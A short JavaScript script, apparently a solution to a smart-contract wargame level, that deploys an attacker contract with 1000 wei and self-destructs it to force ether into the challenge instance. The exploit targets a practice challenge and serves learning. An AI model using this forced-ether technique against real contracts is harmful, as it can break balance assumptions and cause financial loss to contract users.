const loader = require('../loader.js')
const web3 = require('../web3.js')
const instance = require('../prompt.js');

(async () => {
  try {
    let attacker = loader.web3.fromArtifact('HackForce')
    console.log('Deploy attacker contract and send it 1000 wei...')
    const { options: { address } } = await attacker.deploy().send({ value: 1000 })
    attacker = loader.web3.fromArtifact('HackForce', address)
    console.log('Selfdestruct attacker contract...')
    await attacker.methods.destruct(instance).send()
    console.log('Done. Submit yor instance.')
  } catch (err) {
    console.log(err.message)
  }
})()
